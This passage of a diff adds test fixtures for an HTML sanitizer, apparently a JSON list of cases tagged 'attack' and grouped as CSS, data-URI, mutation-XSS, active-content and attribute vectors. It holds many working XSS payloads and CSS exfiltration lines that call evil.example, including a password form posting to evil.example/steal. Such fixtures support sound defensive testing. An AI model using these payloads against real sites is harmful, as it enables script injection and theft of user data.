+   "html": "<div style=\"background:url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-11",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background-image:url(http://evil.example/x.png)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-12",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"list-style-image:url(http://evil.example/x.png)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-13",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"cursor:url(http://evil.example/x.cur),auto\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-14",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"content:url(http://evil.example/x.png)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-15",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"filter:url(http://evil.example/x.svg#f)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-16",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"mask:url(http://evil.example/x.svg)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-17",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background:image-set(url(http://evil.example/x.png) 1x)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-18",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"behavior:url(x.htc)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-19",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"-moz-binding:url(http://evil.example/x.xml#x)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-20",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"-webkit-binding:url(x)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-21",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"color:red;;;background:url(http://evil.example/x);;color:blue\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-22",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"color:red/*;background:url(http://evil.example/x)*/\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-23",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-24",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"position:absolute;top:0;left:0\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-25",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"--x:url(http://evil.example/x);background:var(--x)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-26",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@import \"http://evil.example/x.css\";</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-27",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@import url(http://evil.example/x.css);</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-28",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@import url(javascript:alert(1));</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-29",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@import 'data:text/css,*{background:url(http://evil.example/x)}';</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-30",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>body{background:url(http://evil.example/t.gif)}</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-31",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@font-face{font-family:x;src:url(http://evil.example/f.woff)}</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-32",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>a[href^=\"http://secret\"]{background:url(http://evil.example/leak?a)}</style><a href=\"http://secret.example\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-33",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>input[value^=a]{background:url(http://evil.example/leak?a)}</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-34",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@namespace url(http://evil.example/ns);</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-35",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{content:url(http://evil.example/x)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-36",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p::before{content:\"x\";background:image-set(url(http://evil.example/x) 1x)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-37",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{list-style-image:url(http://evil.example/x)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-38",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{cursor:url(http://evil.example/x),auto}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-39",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@media screen{p{background:url(http://evil.example/x)}}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-40",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@supports (display:grid){p{background:url(http://evil.example/x)}}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-41",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@keyframes x{from{background:url(http://evil.example/x)}}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-42",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@charset \"utf-7\";</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-43",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>@page{background:url(http://evil.example/x)}</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-44",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{--x:url(http://evil.example/x);background:var(--x)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-45",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{width:expression(alert(1))}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-46",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{behavior:url(x.htc)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-47",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{-moz-binding:url(http://evil.example/x.xml#x)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-48",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{background:\\75rl(http://evil.example/x)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-49",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{background:u\\72l(http://evil.example/x)}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-50",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{background:url(\"http://evil.example/x\")}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-51",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{background:URL( http://evil.example/x )}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-52",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{color:red}</style><script>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-53",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>/*</style><script>alert(1)</script>*/</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-54",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{}</style><img src=x onerror=alert(1)><style>ok"
+  },
+  {
+   "id": "css-55",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style><!--</style><img src=x onerror=alert(1)>--></style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-56",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style type=\"text/css\" media=\"screen\">p{position:fixed;inset:0}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-57",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>*{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;background:white}</style>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-58",
+   "category": "css",
+   "kind": "attack",
+   "html": "<style>p{color:red;background:url(http://evil.example/x)}p{color:blue}</style><p>ok</p>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "css-59",
+   "category": "css",
+   "kind": "attack",
+   "html": "<div style=\"background:url(http://evil.example/x)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-01",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-02",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/svg+xml,%3Csvg%20onload=alert(1)%3E\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-03",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/svg+xml;utf8,<svg onload=alert(1)>\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-04",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:text/html,<script>alert(1)</script>\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-05",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-06",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:application/javascript,alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-07",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:text/javascript,alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-08",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/png,not-base64\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-09",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/png;charset=utf-8;base64,iVBORw0KGgo=\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-10",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/png;base64,AAAA\" onerror=\"alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-11",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/png;base64,AAAA&quot; onerror=&quot;alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-12",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/png;base64,AAAA\\\" onerror=alert(1) x=\">ok"
+  },
+  {
+   "id": "data-13",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/gif;base64,R0lGODlhAQABAAAAACw=\" onload=\"alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-14",
+   "category": "data",
+   "kind": "attack",
+   "html": "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-15",
+   "category": "data",
+   "kind": "attack",
+   "html": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-16",
+   "category": "data",
+   "kind": "attack",
+   "html": "<embed src=\"data:text/html,<script>alert(1)</script>\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-17",
+   "category": "data",
+   "kind": "attack",
+   "html": "<a href=\"data:text/html,<script>alert(1)</script>\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-18",
+   "category": "data",
+   "kind": "attack",
+   "html": "<a href=\"DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-19",
+   "category": "data",
+   "kind": "attack",
+   "html": "<a href=\" data:text/html,<script>alert(1)</script>\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-20",
+   "category": "data",
+   "kind": "attack",
+   "html": "<form action=\"data:text/html,<script>alert(1)</script>\"></form>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-21",
+   "category": "data",
+   "kind": "attack",
+   "html": "<video src=\"data:video/mp4;base64,AAAA\"></video>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-22",
+   "category": "data",
+   "kind": "attack",
+   "html": "<audio src=\"data:audio/mpeg;base64,AAAA\"></audio>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "data-23",
+   "category": "data",
+   "kind": "attack",
+   "html": "<img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIG9ubG9hZD0nYWxlcnQoMSknLz4=\" alt=\"x\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-01",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-02",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">ok"
+  },
+  {
+   "id": "mxss-03",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-04",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>ok"
+  },
+  {
+   "id": "mxss-05",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<math><mi><xmp><img src=x onerror=alert(1)>ok"
+  },
+  {
+   "id": "mxss-06",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<xmp><script>alert(1)</script></xmp>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-07",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<listing><img src=x onerror=alert(1)></listing>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-08",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<plaintext><script>alert(1)</script>"
+  },
+  {
+   "id": "mxss-09",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<textarea><script>alert(1)</script></textarea>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-10",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<textarea></textarea><img src=x onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-11",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<title><script>alert(1)</script></title>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-12",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<title></title><img src=x onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-13",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<noembed><img src=x onerror=alert(1)></noembed>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-14",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<noframes><img src=x onerror=alert(1)></noframes>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-15",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<iframe><img src=x onerror=alert(1)></iframe>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-16",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<select><template><style></select><img src onerror=alert(1)>ok"
+  },
+  {
+   "id": "mxss-17",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<table><caption><svg></caption><style>*{}</style><img src onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-18",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<a href=\"https://example.org\"><svg><style><a title=\"</style><img src onerror=alert(1)>\">ok"
+  },
+  {
+   "id": "mxss-19",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<svg><p><style><img src=\"</style><img src=x onerror=alert(1)//\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-20",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<math><mtext><div><style><img src=x onerror=alert(1)></style></div></mtext></math>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-21",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<div><svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></svg></div>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-22",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<!--><script>alert(1)</script>-->ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-23",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<!--[if]><script>alert(1)</script><![endif]-->ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-24",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<!--[if gte mso 9]><xml><o:x></o:x></xml><![endif]--><img src=x onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-25",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<!-- --!><img src=x onerror=alert(1)>-->ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-26",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<!-- --><script>alert(1)</script><!-- -->ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-27",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<![CDATA[><script>alert(1)</script>]]>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-28",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<? ><script>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-29",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<?xml version=\"1.0\"?><script>alert(1)</script>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-30",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<!DOCTYPE html [<!ENTITY x \"<script>alert(1)</script>\">]>&x;ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-31",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<a title=\"x\" <img src=x onerror=alert(1)>\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-32",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<div title=\"</div><img src=x onerror=alert(1)>\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-33",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<img alt=\"</a><script>alert(1)</script>\" src=\"cid:x\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-34",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<p><b><i></p></b></i><img src=x onerror=alert(1)>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-35",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<table><tr><td><svg><td><img src=x onerror=alert(1)></svg>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-36",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<form><form><img src=x onerror=alert(1)>ok"
+  },
+  {
+   "id": "mxss-37",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<a><a href=\"javascript:alert(1)\">ok</a></a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "mxss-38",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<button><button onclick=alert(1)>ok</button></button>"
+  },
+  {
+   "id": "mxss-39",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<ruby><rt><img src=x onerror=alert(1)>ok"
+  },
+  {
+   "id": "mxss-40",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<object><param name=x value=\"</object><img src=x onerror=alert(1)>\">ok"
+  },
+  {
+   "id": "mxss-41",
+   "category": "mxss",
+   "kind": "attack",
+   "html": "<frameset><frame src=\"javascript:alert(1)\"></frameset>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-01",
+   "category": "active",
+   "kind": "attack",
+   "html": "<form action=\"http://evil.example/steal\" method=post><input name=password type=password><button>Send</button></form>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-02",
+   "category": "active",
+   "kind": "attack",
+   "html": "<form><input type=image src=x onerror=alert(1)></form>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-03",
+   "category": "active",
+   "kind": "attack",
+   "html": "<form><button formaction=\"http://evil.example/steal\">ok</button></form>"
+  },
+  {
+   "id": "active-04",
+   "category": "active",
+   "kind": "attack",
+   "html": "<input type=text value=\"ok\">"
+  },
+  {
+   "id": "active-05",
+   "category": "active",
+   "kind": "attack",
+   "html": "<textarea>ok</textarea>"
+  },
+  {
+   "id": "active-06",
+   "category": "active",
+   "kind": "attack",
+   "html": "<select><option>ok</option></select>"
+  },
+  {
+   "id": "active-07",
+   "category": "active",
+   "kind": "attack",
+   "html": "<isindex action=javascript:alert(1) type=submit>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-08",
+   "category": "active",
+   "kind": "attack",
+   "html": "<frameset onload=alert(1)><frame src=x></frameset>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-09",
+   "category": "active",
+   "kind": "attack",
+   "html": "<applet code=\"x.class\"></applet>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-10",
+   "category": "active",
+   "kind": "attack",
+   "html": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-11",
+   "category": "active",
+   "kind": "attack",
+   "html": "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.example/\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-12",
+   "category": "active",
+   "kind": "attack",
+   "html": "<meta http-equiv=\"Set-Cookie\" content=\"x=1\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-13",
+   "category": "active",
+   "kind": "attack",
+   "html": "<meta charset=\"utf-7\">+ADw-script+AD4-alert(1)+ADw-/script+AD4-ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-14",
+   "category": "active",
+   "kind": "attack",
+   "html": "<link rel=import href=\"http://evil.example/x.html\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-15",
+   "category": "active",
+   "kind": "attack",
+   "html": "<link rel=stylesheet href=\"http://evil.example/x.css\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-16",
+   "category": "active",
+   "kind": "attack",
+   "html": "<link rel=prefetch href=\"http://evil.example/x\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-17",
+   "category": "active",
+   "kind": "attack",
+   "html": "<base href=\"http://evil.example/\"><a href=\"x\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-18",
+   "category": "active",
+   "kind": "attack",
+   "html": "<base target=\"_blank\" href=\"javascript:alert(1)//\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-19",
+   "category": "active",
+   "kind": "attack",
+   "html": "<object type=\"text/html\" data=\"http://evil.example/x.html\"></object>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-20",
+   "category": "active",
+   "kind": "attack",
+   "html": "<embed type=\"image/svg+xml\" src=\"http://evil.example/x.svg\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-21",
+   "category": "active",
+   "kind": "attack",
+   "html": "<bgsound src=\"http://evil.example/x.wav\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-22",
+   "category": "active",
+   "kind": "attack",
+   "html": "<audio><source src=\"http://evil.example/x.mp3\"></audio>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-23",
+   "category": "active",
+   "kind": "attack",
+   "html": "<video poster=\"http://evil.example/x.png\"></video>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-24",
+   "category": "active",
+   "kind": "attack",
+   "html": "<iframe src=\"http://evil.example/\" sandbox=\"\"></iframe>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-25",
+   "category": "active",
+   "kind": "attack",
+   "html": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-26",
+   "category": "active",
+   "kind": "attack",
+   "html": "<iframe name=x></iframe><a target=x href=\"https://example.org\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-27",
+   "category": "active",
+   "kind": "attack",
+   "html": "<template><img src=x onerror=alert(1)></template>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "active-28",
+   "category": "active",
+   "kind": "attack",
+   "html": "<slot onclick=alert(1)>ok</slot>"
+  },
+  {
+   "id": "active-29",
+   "category": "active",
+   "kind": "attack",
+   "html": "<dialog open onclose=alert(1)>ok</dialog>"
+  },
+  {
+   "id": "active-30",
+   "category": "active",
+   "kind": "attack",
+   "html": "<portal src=\"http://evil.example/\"></portal>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-01",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div data-x=\"1\" data-onclick=\"alert(1)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-02",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div name=\"getElementById\" id=\"x\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-03",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<img name=\"body\" src=\"cid:x\">ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-04",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<form id=\"x\"><input name=\"y\"></form>ok",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-05",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<a id=\"defaultView\" name=\"defaultView\">ok</a>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-06",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div contenteditable=\"true\" onfocus=\"alert(1)\" tabindex=\"0\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-07",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div draggable=\"true\" ondragstart=\"alert(1)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-08",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div accesskey=\"x\" onclick=\"alert(1)\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
+  },
+  {
+   "id": "attribute-09",
+   "category": "attribute",
+   "kind": "attack",
+   "html": "<div hidden onanimationstart=\"alert(1)\" style=\"animation-name:x\">ok</div>",
+   "keeps": [
+    "ok"
+   ]
